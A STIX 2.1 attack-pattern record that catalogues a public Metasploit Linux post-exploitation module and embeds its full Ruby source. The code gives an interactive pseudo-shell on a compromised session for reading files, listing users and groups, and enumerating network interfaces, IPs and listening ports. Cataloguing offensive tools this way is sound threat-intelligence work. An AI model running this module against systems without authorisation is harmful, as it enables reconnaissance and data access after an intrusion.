{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa7c71e5-ef16-4e51-9e98-2315bfedbeeb",
    "created": "2024-08-14T16:33:13.581061Z",
    "modified": "2024-08-14T16:33:13.581065Z",
    "name": "Pseudo-Shell Post-Exploitation Module",
    "description": " This module will run a Pseudo-Shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/pseudo_shell.rb",
            "external_id": "pseudo_shell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'readline'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Priv\n\n  HELP_COMMANDS = [\n    ['help', 'help', 0, 'Show current help'],\n    ['?', 'help', 0, 'Show current help'],\n    ['ls', 'dir', 1, 'List files and folders in a directory'],\n    ['cat', 'read_file', 1, 'Show file contents'],\n    ['whoami', 'whoami', 0, 'Show current user'],\n    ['cd', 'cd', 1, 'Change current directory'],\n    ['users', 'get_users', 0, 'Show list of users'],\n    ['groups', 'get_groups', 0, 'Show list of groups'],\n    ['pwd', 'pwd', 0, 'Show current PATH'],\n    ['interfaces', 'interfaces', 0, 'Show list of network interfaces'],\n    ['path', 'get_path', 0, 'Show current directories included in $PATH enviroment variable'],\n    ['macs', 'macs', 0, 'Show list of MAC addresses'],\n    ['shell', 'get_shell_name', 0, 'Show current SHELL'],\n    ['hostname', 'get_hostname', 0, 'Show current Hostname'],\n    ['ips', 'ips', 0, 'Show list of current IP addresses'],\n    ['isroot?', 'is_root?', 0, 'Show if current user has root permisions'],\n    ['exit', '', 0, 'Exit the Pseudo-shell'],\n    ['tcp_ports', 'listen_tcp_ports', 0, 'Show list of listen TCP ports'],\n    ['udp_ports', 'listen_udp_ports', 0, 'Show list of listen UDP ports'],\n    ['clear', 'clear_screen', 0, 'Clear screen']\n  ].sort\n\n  LIST = [].sort\n  HELP_COMMANDS.each do |linea|\n    LIST.insert(-1, linea[0])\n  end\n\n  def initialize\n    super(\n      'Name' => 'Pseudo-Shell Post-Exploitation Module',\n      'Description' => %q{\n        This module will run a Pseudo-Shell.\n      },\n      'Author' => 'Alberto Rafael Rodriguez Iglesias <albertocysec[at]gmail.com>',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell', 'meterpreter']\n    )\n  end\n\n  def run\n    @vhostname = get_hostname\n    @vusername = whoami\n    @vpromptchar = is_root? ? '#' : '$'\n    prompt\n  end\n\n  def parse_cmd(cmd)\n    parts = cmd.split(' ')\n    return '' unless parts.length >= 1\n\n    cmd = parts[0]\n    nargs = parts.length - 1\n    HELP_COMMANDS.each do |linea|\n      next unless linea[0] == cmd\n\n      func = linea[1]\n      if nargs >= 1\n        if linea[2] == 1\n          args = parts[1]\n        else\n          nargs = 0\n        end\n      else\n        args = ''\n      end\n\n      return func, cmd, args, nargs\n    end\n\n    error = get_shell_name\n    message = \"#{error}: #{cmd}: Command does not exist\\n\"\n    print message\n    message\n  end\n\n  def help\n    print \"\\n\"\n    print \"Commands Help\\n\"\n    print \"==============\\n\"\n    print \"\\n\"\n    printf(\"\\t%-20s%-100s\\n\", 'Command', 'Description')\n    printf(\"\\t%-20s%-100s\\n\", '-------', '-----------')\n    HELP_COMMANDS.each do |linea|\n      printf(\"\\t%-20s%-100s\\n\", linea[0], linea[3])\n    end\n    print \"\\n\"\n  end\n\n  def prompt_show\n    promptshell = \"#{@vusername}@#{@vhostname}:#{pwd.strip}#{@vpromptchar} \"\n    comp = proc { |s| LIST.grep(/^#{Regexp.escape(s)}/) }\n    Readline.completion_append_character = ' '\n    Readline.completion_proc = comp\n    input = Readline.readline(promptshell, true)\n    return nil if input.nil?\n\n    input\n  end\n\n  def prompt\n    while (input = prompt_show)\n      break if input == 'exit'\n      break if input == 'exit '\n\n      begin\n        func, command, args, nargs = parse_cmd(input)\n        nargs = nargs.to_i\n        if command == 'ls' && (nargs == 0)\n          nargs += 1\n          ruta = pwd\n          args = ruta\n        end\n        if nargs > 0\n          args = args.strip\n          resultado = public_send(func.to_s, args.to_s)\n        elsif input == ''\n          resultado = []\n          resultado.insert(-1, '')\n        else\n          resultado = public_send(func.to_s)\n        end\n        if !resultado.nil? == resultado\n          if command == 'isroot?'\n            print resultado ? \"true\\n\" : \"false\\n\"\n          end\n        elsif resultado.instance_of?(Array)\n          print resultado.join(\"\\n\")\n          print \"\\n\"\n        elsif resultado.strip != ''\n          print resultado.chomp + \"\\n\"\n        end\n      rescue StandardError # begin\n        next\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}